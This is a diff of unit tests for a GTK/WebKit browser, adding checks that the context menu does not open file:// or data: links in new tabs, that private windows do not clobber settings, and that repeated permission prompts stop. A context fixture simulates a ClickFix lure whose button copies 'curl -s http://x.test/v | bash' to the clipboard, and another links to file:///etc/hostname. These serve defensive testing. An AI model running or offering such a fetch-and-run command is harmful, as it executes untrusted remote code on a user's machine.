@@ -104,6 +104,9 @@ PAGES = {
                 "<p id='ok'>text</p></body></html>"),
     "/menu": ("<html><title>menu</title><body><p><a id='link' href='/done?utm_source=mail&amp;k=1'>a link</a></p>"
               "<p><span id='words'>hello   world</span></p></body></html>"),
+    # links a website can't open itself: a file on this computer and a made-up data: page
+    "/menu-local": ("<html><title>menu-local</title><body><p><a id='file' href='file:///etc/hostname'>a file</a></p>"
+                    "<p><a id='data' href='data:text/html,fake-bank'>a data page</a></p></body></html>"),
     # a fake "I'm not a robot" page (ClickFix): its button copies a command to paste into a Terminal
     "/clickfix": ("<html><title>clickfix</title><body><button id='b' style='width:300px;height:80px' onclick=\""
                   "navigator.clipboard.writeText('curl -s http://x.test/v | bash # I am not a robot - Verification ID 1')"
@@ -1698,6 +1701,23 @@ class WindowFeatureTests(unittest.TestCase):
         clipboard = Gtk.Clipboard.get(Gdk.SELECTION_CLIPBOARD)
         self.assertTrue(spin(lambda: clipboard.wait_for_text() == self.base + "/done?k=1", 3), clipboard.wait_for_text())
 
+    def test_right_click_opens_only_web_links_in_a_new_tab(self):
+        # "Open Link in New Tab" loaded any link, so a page could offer a file on this computer or a data: page
+        # made to look like another site, which the page itself is not allowed to open.
+        win = self.win
+        self.addCleanup(self.close_new_tabs, win._tab_boxes())
+        tab = self.open_tab("/menu-local", "menu-local")
+        wv = tab._arrow_webview
+        win.notebook.set_current_page(win.notebook.page_num(tab))
+        for element in ("file", "data"):
+            items = self.menu_items(wv, element)
+            self.assertNotIn("Open Link in New Tab", items, element)
+            self.assertNotIn("Open Link in New Window", items, element)
+            self.close_menus(list(items.values()))
+        tab = self.open_tab("/menu", "menu")
+        win.notebook.set_current_page(win.notebook.page_num(tab))
+        self.assertIn("Open Link in New Tab", self.menu_items(tab._arrow_webview, "link"))
+
     def test_right_click_searches_for_selected_text(self):
         # Its own test: after one synthetic right-click menu, the next synthetic click clears the selection.
         win = self.win
@@ -3016,6 +3036,69 @@ class WindowFeatureTests(unittest.TestCase):
         finally:
             private.destroy()
 
+
+    def test_a_private_window_does_not_undo_settings_changed_in_the_normal_one(self):
+        # Each window saved its whole copy of the settings, read when it opened: changing a setting in a private
+        # window turned dark mode off again after it was turned on in the normal window.
+        # Changed the way Settings' switches change them: the attribute, then save_settings().
+        win = self.win
+        private = bb.ArrowBrowserWindow(private=True)
+        self.addCleanup(private.destroy)
+        before = (win.lookalike_warning_enabled, win.block_notification_requests)
+        self.addCleanup(lambda: (setattr(win, "lookalike_warning_enabled", before[0]),
+                                 setattr(win, "block_notification_requests", before[1]), win.save_settings()))
+        win.lookalike_warning_enabled = not before[0]
+        win.save_settings()
+        private.block_notification_requests = not before[1]
+        private.save_settings()
+        saved = bb.load_persistent_settings()
+        self.assertEqual((saved["lookalike_warning_enabled"], saved["block_notification_requests"]),
+                         (not before[0], not before[1]))
+
+    def test_clearing_browsing_data_is_left_to_the_normal_window(self):
+        # In a private window it cleared only that window's throw-away data and wrote an empty history that the
+        # normal window's next save filled in again, while the dialog said you would be signed out.
+        private = bb.ArrowBrowserWindow(private=True)
+        self.addCleanup(private.destroy)
+        bb.save_url_history([{"url": self.base + "/kept", "title": "kept"}])
+        private.on_clear_cache_clicked(None)
+        self.assertEqual(bb.load_url_history()[0]["url"], self.base + "/kept")
+
+    def test_a_site_told_no_three_times_is_not_asked_again(self):
+        # The question holds up the whole window, and a page could ask again the moment it was told No.
+        win = self.win
+        wv = self.load("/thin", "thin")
+        self.addCleanup(win._permission_refusals.clear)
+        self.addCleanup(delattr, win, "_describe_permission")
+        win._describe_permission = lambda request: ("location", "know your location")
+        asked = []
+
+        def answer():
+            for w in Gtk.Window.list_toplevels():
+                if isinstance(w, Gtk.MessageDialog) and w.get_visible() and (w.props.text or "").startswith("Allow"):
+                    asked.append(w.props.text)
+                    w.response(Gtk.ResponseType.NO)
+            return True
+        source = GLib.timeout_add(50, answer)
+        self.addCleanup(GLib.source_remove, source)
+
+        class Request:
+            def __init__(self):
+                self.answer = None
+
+            def allow(self):
+                self.answer = "allow"
+
+            def deny(self):
+                self.answer = "deny"
+        answers = []
+        for _ in range(win.PERMISSION_ASK_LIMIT + 2):
+            request = Request()
+            win.on_permission_request(wv, request)
+            answers.append(request.answer)
+        self.assertEqual(answers, ["deny"] * (win.PERMISSION_ASK_LIMIT + 2))
+        self.assertEqual(asked, ["Allow 127.0.0.1 to know your location?"] * win.PERMISSION_ASK_LIMIT)
+        self.assertNotIn("permissions", win.site_settings.get("127.0.0.1", {}), "nothing remembered on disk")
 
     def test_windows_get_minimize_and_maximize_buttons_under_wsl(self):
         original = bb.running_under_wsl
